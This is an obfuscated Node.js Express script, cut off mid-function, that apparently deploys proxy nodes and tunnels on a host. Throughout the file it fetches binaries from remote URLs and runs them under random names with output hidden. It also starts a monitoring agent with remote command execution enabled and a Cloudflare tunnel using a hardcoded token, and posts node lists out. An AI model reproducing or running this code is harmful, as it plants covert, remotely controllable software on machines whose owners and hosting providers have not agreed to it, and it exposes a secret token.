const _0x301882=_0x2040;(function(_0x164e19,_0x17e2cc){const _0x3cc1b5={_0x241bcd:0x136,_0x5e2ac0:0x165,_0x23f4c1:0xf0,_0x3659b2:0xef,_0x413ae8:0x128,_0x322c54:0x168,_0xc9aa7e:0x101},_0xaed9cf=_0x2040,_0x2e5597=_0x164e19();while(!![]){try{const _0x54c073=parseInt(_0xaed9cf(_0x3cc1b5._0x241bcd))/0x1*(parseInt(_0xaed9cf(_0x3cc1b5._0x5e2ac0))/0x2)+parseInt(_0xaed9cf(_0x3cc1b5._0x23f4c1))/0x3*(parseInt(_0xaed9cf(0x14e))/0x4)+-parseInt(_0xaed9cf(0x188))/0x5*(-parseInt(_0xaed9cf(_0x3cc1b5._0x3659b2))/0x6)+-parseInt(_0xaed9cf(0x135))/0x7*(-parseInt(_0xaed9cf(_0x3cc1b5._0x413ae8))/0x8)+parseInt(_0xaed9cf(_0x3cc1b5._0x322c54))/0x9*(-parseInt(_0xaed9cf(0xf6))/0xa)+-parseInt(_0xaed9cf(_0x3cc1b5._0xc9aa7e))/0xb+-parseInt(_0xaed9cf(0x18b))/0xc*(parseInt(_0xaed9cf(0x161))/0xd);if(_0x54c073===_0x17e2cc)break;else _0x2e5597['push'](_0x2e5597['shift']());}catch(_0x2a1232){_0x2e5597['push'](_0x2e5597['shift']());}}}(_0x5070,0xb35a8));const express=require('express'),app=express(),axios=require(_0x301882(0x126)),os=require('os'),fs=require('fs'),path=require(_0x301882(0x110)),{promisify}=require(_0x301882(0x124)),exec=promisify(require(_0x301882(0xf5))[_0x301882(0x17f)]),UPLOAD_URL=process[_0x301882(0x183)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x301882(0x178)]||'',AUTO_ACCESS=process[_0x301882(0x183)][_0x301882(0x11b)]||![],FILE_PATH=process[_0x301882(0x183)][_0x301882(0x106)]||_0x301882(0x172),SUB_PATH=process[_0x301882(0x183)][_0x301882(0x18e)]||_0x301882(0x16a),PORT=process[_0x301882(0x183)]['SERVER_PORT']||process[_0x301882(0x183)][_0x301882(0x105)]||0xbb8,UUID=process[_0x301882(0x183)][_0x301882(0x13f)]||'aefdc215-f502-407a-8b93-eb3115d97a4b',NEZHA_SERVER=process[_0x301882(0x183)][_0x301882(0x132)]||'',NEZHA_PORT=process[_0x301882(0x183)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x301882(0x102)]||'',ARGO_DOMAIN=process['env'][_0x301882(0x130)]||_0x301882(0xe4),ARGO_AUTH=process[_0x301882(0x183)][_0x301882(0x177)]||'eyJhIjoiMmFmZDExNjdiZjljNTczMjRmMTI4NzFiNjQ4NzE2MDkiLCJ0IjoiMmE4ZDhiNTQtMzE2Ny00YzkyLWJiOTYtZTdjM2UwNjM4NGRmIiwicyI6IlpHWTROVFkxTURVdFkyUmtOeTAwWmpkaExXSm1PR1V0WlRGaE56VTNNakEyT1RNeSJ9',ARGO_PORT=process[_0x301882(0x183)][_0x301882(0xdb)]||0x1f41,CFIP=process[_0x301882(0x183)][_0x301882(0x11c)]||_0x301882(0x159),CFPORT=process[_0x301882(0x183)][_0x301882(0x125)]||0x1bb,NAME=process[_0x301882(0x183)]['NAME']||'Galaxy';!fs[_0x301882(0xf7)](FILE_PATH)?(fs[_0x301882(0x173)](FILE_PATH),console[_0x301882(0xd4)](FILE_PATH+_0x301882(0xfd))):console[_0x301882(0xd4)](FILE_PATH+_0x301882(0x115));function generateRandomName(){const _0x1cbde5={_0x278510:0x120,_0x2e1b39:0x10c,_0x372f3c:0x18c},_0x2947b0=_0x301882,_0x22619b=_0x2947b0(0xf8);let _0x4a772f='';for(let _0x48f512=0x0;_0x48f512<0x6;_0x48f512++){_0x4a772f+=_0x22619b[_0x2947b0(_0x1cbde5._0x278510)](Math['floor'](Math[_0x2947b0(_0x1cbde5._0x2e1b39)]()*_0x22619b[_0x2947b0(_0x1cbde5._0x372f3c)]));}return _0x4a772f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x301882(0x16b)](FILE_PATH,phpName),webPath=path[_0x301882(0x16b)](FILE_PATH,webName),botPath=path[_0x301882(0x16b)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x301882(0x163)),listPath=path[_0x301882(0x16b)](FILE_PATH,_0x301882(0x18f)),bootLogPath=path['join'](FILE_PATH,_0x301882(0x195)),configPath=path[_0x301882(0x16b)](FILE_PATH,_0x301882(0x14b));function deleteNodes(){const _0x33fa34={_0x230b7c:0xd2,_0x108e68:0x12b,_0x547b28:0x148,_0x4da6cf:0xe0,_0x4c5156:0x12c},_0x5d276f=_0x301882;try{if(!UPLOAD_URL)return;if(!fs[_0x5d276f(0xf7)](subPath))return;let _0x4641c7;try{_0x4641c7=fs['readFileSync'](subPath,_0x5d276f(_0x33fa34._0x230b7c));}catch{return null;}const _0x3f54ec=Buffer[_0x5d276f(0xd8)](_0x4641c7,_0x5d276f(0x17d))[_0x5d276f(0x185)](_0x5d276f(_0x33fa34._0x230b7c)),_0x501d88=_0x3f54ec[_0x5d276f(0x192)]('\x0a')[_0x5d276f(_0x33fa34._0x108e68)](_0x59a247=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5d276f(0xcf)](_0x59a247));if(_0x501d88['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x5d276f(_0x33fa34._0x547b28),JSON[_0x5d276f(_0x33fa34._0x4da6cf)]({'nodes':_0x501d88}),{'headers':{'Content-Type':_0x5d276f(_0x33fa34._0x4c5156)}})[_0x5d276f(0x11a)](_0x238758=>{return null;}),null;}catch(_0x486f1b){return null;}}function cleanupOldFiles(){const _0x275cde={_0x5d4c14:0x153},_0x36c058={_0x5e298f:0x16b,_0x3a9465:0x12f},_0x368038=_0x301882;try{const _0x13ea18=fs[_0x368038(_0x275cde._0x5d4c14)](FILE_PATH);_0x13ea18['forEach'](_0x463a1f=>{const _0x320c12=_0x368038,_0xc8c759=path[_0x320c12(_0x36c058._0x5e298f)](FILE_PATH,_0x463a1f);try{const _0x21dede=fs[_0x320c12(0x100)](_0xc8c759);_0x21dede[_0x320c12(0x15f)]()&&fs[_0x320c12(_0x36c058._0x3a9465)](_0xc8c759);}catch(_0x566db4){}});}catch(_0x231122){}}function _0x2040(_0x4b26d6,_0x2470df){const _0x50702e=_0x5070();return _0x2040=function(_0x204072,_0x25b0bc){_0x204072=_0x204072-0xcd;let _0x5586f7=_0x50702e[_0x204072];return _0x5586f7;},_0x2040(_0x4b26d6,_0x2470df);}async function generateConfig(){const _0x5e9bcd={_0x48c425:0xec,_0x53fa2b:0x13d,_0x1990ad:0xf2,_0x5d1cde:0x176,_0x397e78:0xec,_0x4ec1c8:0x184,_0x3ed621:0x140,_0x10c563:0x139,_0x1322ce:0xfe,_0x394acd:0x16e,_0x4f4d65:0x191,_0x234f6f:0x11e,_0x2f5c16:0x16d,_0xa2082d:0xe0},_0x25976c=_0x301882,_0x53b88b={'log':{'access':_0x25976c(0xdd),'error':_0x25976c(0xdd),'loglevel':_0x25976c(0x140)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x25976c(_0x5e9bcd._0x48c425),'settings':{'clients':[{'id':UUID,'flow':_0x25976c(_0x5e9bcd._0x53fa2b)}],'decryption':_0x25976c(0x140),'fallbacks':[{'dest':0xbb9},{'path':_0x25976c(_0x5e9bcd._0x1990ad),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x25976c(0x116),'dest':0xbbc}]},'streamSettings':{'network':_0x25976c(_0x5e9bcd._0x5d1cde)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x25976c(_0x5e9bcd._0x397e78),'settings':{'clients':[{'id':UUID}],'decryption':_0x25976c(0x140)},'streamSettings':{'network':'tcp','security':_0x25976c(0x140)}},{'port':0xbba,'listen':_0x25976c(_0x5e9bcd._0x4ec1c8),'protocol':_0x25976c(0xec),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x25976c(_0x5e9bcd._0x3ed621),'wsSettings':{'path':_0x25976c(_0x5e9bcd._0x1990ad)}},'sniffing':{'enabled':!![],'destOverride':[_0x25976c(_0x5e9bcd._0x10c563),'tls',_0x25976c(0xe7)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x25976c(_0x5e9bcd._0x4ec1c8),'protocol':_0x25976c(0xd5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x25976c(0x11f)}},'sniffing':{'enabled':!![],'destOverride':[_0x25976c(_0x5e9bcd._0x10c563),_0x25976c(_0x5e9bcd._0x1322ce),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x25976c(_0x5e9bcd._0x394acd),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x25976c(0x116)}},'sniffing':{'enabled':!![],'destOverride':[_0x25976c(0x139),'tls',_0x25976c(0xe7)],'metadataOnly':![]}}],'dns':{'servers':[_0x25976c(_0x5e9bcd._0x4f4d65)]},'outbounds':[{'protocol':'freedom','tag':_0x25976c(_0x5e9bcd._0x234f6f)},{'protocol':'blackhole','tag':'block'}]};fs[_0x25976c(_0x5e9bcd._0x2f5c16)](path['join'](FILE_PATH,'config.json'),JSON[_0x25976c(_0x5e9bcd._0xa2082d)](_0x53b88b,null,0x2));}function getSystemArchitecture(){const _0x5a4387={_0xc9c3f2:0x198,_0x3b3cef:0x156},_0xd0b225=_0x301882,_0x2f1bc8=os[_0xd0b225(_0x5a4387._0xc9c3f2)]();return _0x2f1bc8===_0xd0b225(_0x5a4387._0x3b3cef)||_0x2f1bc8==='arm64'||_0x2f1bc8===_0xd0b225(0x13c)?_0xd0b225(0x156):_0xd0b225(0x122);}function downloadFile(_0xda0a8d,_0x52f9d7,_0x4ca193){const _0x15b5f2={_0x248b0d:0x15c,_0x3c8233:0xdf,_0x4f6f59:0x109,_0x5110bc:0x11a},_0x52007e={_0x8f856c:0x15d},_0x2baf21={_0x54df06:0x114,_0x53ad7e:0xf3,_0x438603:0xd9},_0x1d9e4c=_0x301882,_0x394c09=_0xda0a8d;!fs['existsSync'](FILE_PATH)&&fs[_0x1d9e4c(0x173)](FILE_PATH,{'recursive':!![]});const _0x957b8f=fs[_0x1d9e4c(_0x15b5f2._0x248b0d)](_0x394c09);axios({'method':'get','url':_0x52f9d7,'responseType':_0x1d9e4c(_0x15b5f2._0x3c8233)})[_0x1d9e4c(_0x15b5f2._0x4f6f59)](_0x4d6d4c=>{const _0x42d087={_0x40c1aa:0xd9,_0x6f3d7d:0x149,_0x2a1750:0xda},_0x1afdfe=_0x1d9e4c;_0x4d6d4c[_0x1afdfe(0x199)][_0x1afdfe(0xe9)](_0x957b8f),_0x957b8f['on'](_0x1afdfe(0x144),()=>{const _0x3190a6=_0x1afdfe;_0x957b8f[_0x3190a6(_0x2baf21._0x54df06)](),console['log'](_0x3190a6(_0x2baf21._0x53ad7e)+path[_0x3190a6(_0x2baf21._0x438603)](_0x394c09)+'\x20successfully'),_0x4ca193(null,_0x394c09);}),_0x957b8f['on']('error',_0x4b8c2b=>{const _0x5728c6=_0x1afdfe;fs[_0x5728c6(0x194)](_0x394c09,()=>{});const _0x4b4369=_0x5728c6(0xf3)+path[_0x5728c6(_0x42d087._0x40c1aa)](_0x394c09)+_0x5728c6(_0x42d087._0x6f3d7d)+_0x4b8c2b[_0x5728c6(0x15d)];console[_0x5728c6(_0x42d087._0x2a1750)](_0x4b4369),_0x4ca193(_0x4b4369);});})[_0x1d9e4c(_0x15b5f2._0x5110bc)](_0x47d200=>{const _0x16f5b3=_0x1d9e4c,_0x4af4c7=_0x16f5b3(0xf3)+path[_0x16f5b3(0xd9)](_0x394c09)+'\x20failed:\x20'+_0x47d200[_0x16f5b3(_0x52007e._0x8f856c)];console[_0x16f5b3(0xda)](_0x4af4c7),_0x4ca193(_0x4af4c7);});}async function downloadFilesAndRun(){const _0x1fd1fc={_0x1289e1:0x170,_0x2641ee:0xda,_0x390594:0xd3,_0x142b30:0x192,_0x34863c:0x167,_0x34505e:0x160,_0x4e7c4c:0x158,_0x39d6d7:0xce,_0x5c957c:0x10f,_0x5833ec:0x16b,_0x2cfb73:0xe3,_0x41eca4:0x17c,_0x2675d4:0x190,_0x3ac430:0xda,_0x523d33:0x15e,_0x259f90:0x160,_0x1b3d09:0x129,_0x5baac2:0xd7,_0x434957:0xd4,_0x34a1c8:0xe2,_0x537ae:0xd4,_0x376d78:0xf1,_0x40f4ff:0xe6,_0x273ff4:0x11d,_0x52cff3:0x186,_0x2889de:0x142,_0x11ecc2:0x13a},_0x519c62={_0x135034:0x134},_0x3db072={_0x282b26:0xf7,_0xefed14:0x182},_0x20455e=_0x301882,_0x1dad3c=getSystemArchitecture(),_0xed37c0=getFilesForArchitecture(_0x1dad3c);if(_0xed37c0[_0x20455e(0x18c)]===0x0){console[_0x20455e(0xd4)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x31c89e=_0xed37c0[_0x20455e(_0x1fd1fc._0x1289e1)](_0x3918c1=>{const _0x24dbb9={_0x5bb3f6:0xd6};return new Promise((_0x2dae18,_0x393e95)=>{const _0x329016=_0x2040;downloadFile(_0x3918c1[_0x329016(0x166)],_0x3918c1[_0x329016(_0x24dbb9._0x5bb3f6)],(_0x370532,_0x1faf25)=>{_0x370532?_0x393e95(_0x370532):_0x2dae18(_0x1faf25);});});});try{await Promise['all'](_0x31c89e);}catch(_0x44812a){console[_0x20455e(_0x1fd1fc._0x2641ee)](_0x20455e(0xd0),_0x44812a);return;}function _0x27f2e3(_0x5150f7){const _0x4c4566={_0x18f86b:0x189,_0x544f22:0xd4,_0x10faf7:0xde},_0x491412=_0x20455e,_0xa85506=0x1fd;_0x5150f7[_0x491412(_0x519c62._0x135034)](_0x4ba805=>{const _0x56dff2=_0x491412;fs[_0x56dff2(_0x3db072._0x282b26)](_0x4ba805)&&fs[_0x56dff2(_0x3db072._0xefed14)](_0x4ba805,_0xa85506,_0x3903c3=>{const _0xad2e8d=_0x56dff2;_0x3903c3?console[_0xad2e8d(0xda)](_0xad2e8d(_0x4c4566._0x18f86b)+_0x4ba805+':\x20'+_0x3903c3):console[_0xad2e8d(_0x4c4566._0x544f22)](_0xad2e8d(_0x4c4566._0x10faf7)+_0x4ba805+':\x20'+_0xa85506[_0xad2e8d(0x185)](0x8));});});}const _0x2f8b2f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x27f2e3(_0x2f8b2f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x50737c=NEZHA_SERVER[_0x20455e(_0x1fd1fc._0x390594)](':')?NEZHA_SERVER[_0x20455e(_0x1fd1fc._0x142b30)](':')[_0x20455e(0x147)]():'',_0x1c0f1=new Set([_0x20455e(0x162),_0x20455e(_0x1fd1fc._0x34863c),_0x20455e(_0x1fd1fc._0x34505e),'2087',_0x20455e(_0x1fd1fc._0x4e7c4c),'2053']),_0x209841=_0x1c0f1[_0x20455e(0xf4)](_0x50737c)?_0x20455e(_0x1fd1fc._0x39d6d7):_0x20455e(_0x1fd1fc._0x5c957c),_0x23fcd0='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x20455e(0x131)+_0x209841+_0x20455e(0x18d)+UUID;fs[_0x20455e(0x16d)](path[_0x20455e(_0x1fd1fc._0x5833ec)](FILE_PATH,_0x20455e(_0x1fd1fc._0x2cfb73)),_0x23fcd0);const _0x1ac557=_0x20455e(_0x1fd1fc._0x41eca4)+phpPath+_0x20455e(_0x1fd1fc._0x2675d4)+FILE_PATH+_0x20455e(0x157);try{await exec(_0x1ac557),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x3d9ae9=>setTimeout(_0x3d9ae9,0x3e8));}catch(_0x1f2be5){console[_0x20455e(_0x1fd1fc._0x3ac430)](_0x20455e(_0x1fd1fc._0x523d33)+_0x1f2be5);}}else{let _0x2f77b7='';const _0x5bc05b=['443',_0x20455e(_0x1fd1fc._0x34863c),_0x20455e(_0x1fd1fc._0x259f90),'2087',_0x20455e(0x158),'2053'];_0x5bc05b[_0x20455e(0xd3)](NEZHA_PORT)&&(_0x2f77b7=_0x20455e(_0x1fd1fc._0x1b3d09));const _0x58210c='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2f77b7+_0x20455e(_0x1fd1fc._0x5baac2);try{await exec(_0x58210c),console[_0x20455e(_0x1fd1fc._0x434957)](npmName+_0x20455e(_0x1fd1fc._0x34a1c8)),await new Promise(_0x1d87d6=>setTimeout(_0x1d87d6,0x3e8));}catch(_0x2cce7e){console[_0x20455e(0xda)]('npm\x20running\x20error:\x20'+_0x2cce7e);}}}else console[_0x20455e(_0x1fd1fc._0x537ae)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x13992a=_0x20455e(0x17c)+webPath+_0x20455e(_0x1fd1fc._0x376d78)+FILE_PATH+_0x20455e(_0x1fd1fc._0x40f4ff);try{await exec(_0x13992a),console[_0x20455e(_0x1fd1fc._0x537ae)](webName+'\x20is\x20running'),await new Promise(_0x53b298=>setTimeout(_0x53b298,0x3e8));}catch(_0x52bff0){console[_0x20455e(0xda)](_0x20455e(0x175)+_0x52bff0);}if(fs[_0x20455e(0xf7)](botPath)){let _0xd745d2;if(ARGO_AUTH[_0x20455e(0xe5)](/^[A-Z0-9a-z=]{120,250}$/))_0xd745d2=_0x20455e(0x119)+ARGO_AUTH;else ARGO_AUTH[_0x20455e(0xe5)](/TunnelSecret/)?_0xd745d2=_0x20455e(0x138)+FILE_PATH+_0x20455e(0xe8):_0xd745d2=_0x20455e(_0x1fd1fc._0x273ff4)+FILE_PATH+_0x20455e(_0x1fd1fc._0x52cff3)+ARGO_PORT;try{await exec(_0x20455e(_0x1fd1fc._0x41eca4)+botPath+'\x20'+_0xd745d2+_0x20455e(_0x1fd1fc._0x2889de)),console[_0x20455e(0xd4)](botName+'\x20is\x20running'),await new Promise(_0x23ee3e=>setTimeout(_0x23ee3e,0x7d0));}catch(_0x3c4b76){console[_0x20455e(0xda)](_0x20455e(_0x1fd1fc._0x11ecc2)+_0x3c4b76);}}await new Promise(_0x549b59=>setTimeout(_0x549b59,0x1388));}function getFilesForArchitecture(_0xbb907b){const _0x51f4f4={_0x3eeba3:0x169,_0x15a21c:0x15b,_0x323c92:0x12a,_0x52dd86:0x156,_0x29f1ed:0x143},_0x1cffbd=_0x301882;let _0x14c2fa;_0xbb907b===_0x1cffbd(0x156)?_0x14c2fa=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x14c2fa=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1cffbd(_0x51f4f4._0x3eeba3)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x423af8=_0xbb907b==='arm'?_0x1cffbd(_0x51f4f4._0x15a21c):_0x1cffbd(_0x51f4f4._0x323c92);_0x14c2fa[_0x1cffbd(0x143)]({'fileName':npmPath,'fileUrl':_0x423af8});}else{const _0xb46adc=_0xbb907b===_0x1cffbd(_0x51f4f4._0x52dd86)?_0x1cffbd(0xdc):_0x1cffbd(0xeb);_0x14c2fa[_0x1cffbd(_0x51f4f4._0x29f1ed)]({'fileName':phpPath,'fileUrl':_0xb46adc});}}return _0x14c2fa;}function argoType(){const _0x5ea720={_0x2a6a11:0xd4,_0x5afde7:0x10b,_0x2319fc:0x187,_0x3d7f2e:0x13b,_0x454633:0x16d,_0x2eed37:0x16b,_0x57afc1:0x151},_0x2091e7=_0x301882;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2091e7(_0x5ea720._0x2a6a11)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2091e7(0xd3)](_0x2091e7(_0x5ea720._0x5afde7))){fs['writeFileSync'](path['join'](FILE_PATH,_0x2091e7(_0x5ea720._0x2319fc)),ARGO_AUTH);const _0x783282=_0x2091e7(0x174)+ARGO_AUTH['split']('\x22')[0xb]+_0x2091e7(0x180)+path[_0x2091e7(0x16b)](FILE_PATH,_0x2091e7(0x187))+_0x2091e7(_0x5ea720._0x3d7f2e)+ARGO_DOMAIN+_0x2091e7(0xea)+ARGO_PORT+_0x2091e7(0x121);fs[_0x2091e7(_0x5ea720._0x454633)](path[_0x2091e7(_0x5ea720._0x2eed37)](FILE_PATH,_0x2091e7(0xfb)),_0x783282);}else console[_0x2091e7(_0x5ea720._0x2a6a11)](_0x2091e7(_0x5ea720._0x57afc1));}function _0x5070(){const _0x194278=['\x20>/dev/null\x202>&1\x20&','unshift','finish','\x0a\x20\x20\x20\x20','platform','pop','/api/delete-nodes','\x20failed:\x20','countryCode','config.json','promises','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','68oxsgOZ','http://ip-api.com/json','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Add\x20automatic\x20access\x20task\x20faild:\x20','readdirSync','Subscription\x20uploaded\x20successfully','get','arm','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2083','cdns.doon.eu.org','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://arm64.ssss.nyc.mn/agent','createWriteStream','message','php\x20running\x20error:\x20','isFile','2096','9804522GMOSbm','443','sub.txt','readFileSync','2931190rZWzpQ','fileName','8443','684VRAjPf','https://amd64.ssss.nyc.mn/bot','abc','join','post','writeFileSync','trojan','del\x20/f\x20/q\x20','map','\x20>/dev/null\x202>&1','.tmp','mkdirSync','\x0a\x20\x20tunnel:\x20','web\x20running\x20error:\x20','tcp','ARGO_AUTH','PROJECT_URL','substring','org','/vmess-argo?ed=2560','nohup\x20','base64','ArgoDomain:','exec','\x0a\x20\x20credentials-file:\x20','&path=%2Fvless-argo%3Fed%3D2560#','chmod','env','127.0.0.1','toString','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel.json','10LgvUsP','Empowerment\x20failed\x20for\x20','Error\x20in\x20startserver:','24jfqllg','length','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','SUB_PATH','list.txt','\x20-c\x20\x22','https+local://8.8.8.8/dns-query','split','status','unlink','boot.log','\x0avless://','set','arch','data','/sub.txt\x20saved\x20successfully','true','test','Error\x20downloading\x20files:','firefox','utf-8','includes','log','vmess','fileUrl','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','from','basename','error','ARGO_PORT','https://arm64.ssss.nyc.mn/v1','/dev/null','Empowerment\x20success\x20for\x20','stream','stringify','listen','\x20is\x20running','config.yaml','chunge.cchen.cc.cd','match','/config.json\x20>/dev/null\x202>&1\x20&','quic','/tunnel.yml\x20run','pipe','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/v1','vless','&fp=firefox&type=ws&host=','index.html','3480822daPmUz','10524EwPKLs','\x20-c\x20','/vless-argo','Download\x20','has','child_process','162350igTvWs','existsSync','abcdefghijklmnopqrstuvwxyz','taskkill\x20/f\x20/im\x20','push','tunnel.yml','Content-Type','\x20is\x20created','tls','&path=%2Ftrojan-argo%3Fed%3D2560#','statSync','4093991PBxkAd','NEZHA_KEY','Nodes\x20uploaded\x20successfully','country_code','PORT','FILE_PATH','https://ipapi.co/json','readFile','then','clear','TunnelSecret','random','Error\x20reading\x20boot.log:','App\x20is\x20running','false','path','success','win32','response','close','\x20already\x20exists','/trojan-argo','?encryption=none&security=tls&sni=','/api/add-subscriptions','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','catch','AUTO_ACCESS','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','direct','/vmess-argo','charAt','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','amd','.exe\x20>\x20nul\x202>&1','util','CFPORT','axios','send','1551408gARieg','--tls','https://amd64.ssss.nyc.mn/agent','filter','application/json','text/plain;\x20charset=utf-8','http\x20server\x20is\x20running\x20on\x20port:','unlinkSync','ARGO_DOMAIN','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA_SERVER','/api/add-nodes','forEach','42GIZdks','1kMZGgG','\x22\x20>\x20/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','http','Error\x20executing\x20command:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','aarch64','xtls-rprx-vision','automatic\x20access\x20task\x20added\x20successfully','UUID','none','\x20>\x20nul\x202>&1'];_0x5070=function(){return _0x194278;};return _0x5070();}async function extractDomains(){const _0x2c60ab={_0x183c11:0x164,_0x3ff590:0xd2,_0x17274a:0x192,_0x183c10:0x17e,_0x529865:0xd4,_0x5038fa:0x16b,_0x4dbc78:0x195,_0x3587dd:0x17c,_0x6bec4b:0xd4,_0x4bb4e0:0xda,_0x5353a6:0x13a,_0xacc182:0xda,_0xa09aec:0x10d},_0x226474={_0x4b8663:0x155,_0x619010:0x199,_0x11b548:0x14f,_0x723707:0x193,_0x3d9f1e:0x111,_0xf404f4:0x14a,_0x5432be:0x199,_0x382e21:0x17a},_0x33766b={_0x56c4ba:0x112,_0xdaaf38:0xf9,_0xbb0ae7:0x179,_0x745484:0x137},_0x1eba8d=_0x301882;let _0x1aac88;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1aac88=ARGO_DOMAIN,console[_0x1eba8d(0xd4)]('ARGO_DOMAIN:',_0x1aac88),await _0x5e6d88(_0x1aac88);else try{const _0x40eb97=fs[_0x1eba8d(_0x2c60ab._0x183c11)](path[_0x1eba8d(0x16b)](FILE_PATH,_0x1eba8d(0x195)),_0x1eba8d(_0x2c60ab._0x3ff590)),_0x2da167=_0x40eb97[_0x1eba8d(_0x2c60ab._0x17274a)]('\x0a'),_0x1904fd=[];_0x2da167['forEach'](_0x3f41e7=>{const _0x5dbfa0=_0x1eba8d,_0x2bd89b=_0x3f41e7[_0x5dbfa0(0xe5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2bd89b){const _0x5dafbe=_0x2bd89b[0x1];_0x1904fd[_0x5dbfa0(0xfa)](_0x5dafbe);}});if(_0x1904fd[_0x1eba8d(0x18c)]>0x0)_0x1aac88=_0x1904fd[0x0],console['log'](_0x1eba8d(_0x2c60ab._0x183c10),_0x1aac88),await _0x5e6d88(_0x1aac88);else{console[_0x1eba8d(_0x2c60ab._0x529865)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x1eba8d(0x12f)](path[_0x1eba8d(_0x2c60ab._0x5038fa)](FILE_PATH,_0x1eba8d(_0x2c60ab._0x4dbc78)));async function _0x20006a(){const _0x49e323=_0x1eba8d;try{process[_0x49e323(0x146)]===_0x49e323(_0x33766b._0x56c4ba)?await exec(_0x49e323(_0x33766b._0xdaaf38)+botName+_0x49e323(0x123)):await exec('pkill\x20-f\x20\x22['+botName[_0x49e323(0x120)](0x0)+']'+botName[_0x49e323(_0x33766b._0xbb0ae7)](0x1)+_0x49e323(_0x33766b._0x745484));}catch(_0x484cfe){}}_0x20006a(),await new Promise(_0x1c2e02=>setTimeout(_0x1c2e02,0xbb8));const _0x28d302='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1eba8d(0x186)+ARGO_PORT;try{await exec(_0x1eba8d(_0x2c60ab._0x3587dd)+botPath+'\x20'+_0x28d302+'\x20>/dev/null\x202>&1\x20&'),console[_0x1eba8d(_0x2c60ab._0x6bec4b)](botName+'\x20is\x20running'),await new Promise(_0x326b36=>setTimeout(_0x326b36,0xbb8)),await extractDomains();}catch(_0x46726b){console[_0x1eba8d(_0x2c60ab._0x4bb4e0)](_0x1eba8d(_0x2c60ab._0x5353a6)+_0x46726b);}}}catch(_0xaa4209){console[_0x1eba8d(_0x2c60ab._0xacc182)](_0x1eba8d(_0x2c60ab._0xa09aec),_0xaa4209);}async function _0x2e9b88(){const _0x193b12=_0x1eba8d;try{const _0x298095=await axios[_0x193b12(_0x226474._0x4b8663)](_0x193b12(0x107),{'timeout':0xbb8});if(_0x298095[_0x193b12(0x199)]&&_0x298095['data']['country_code']&&_0x298095[_0x193b12(0x199)]['org'])return 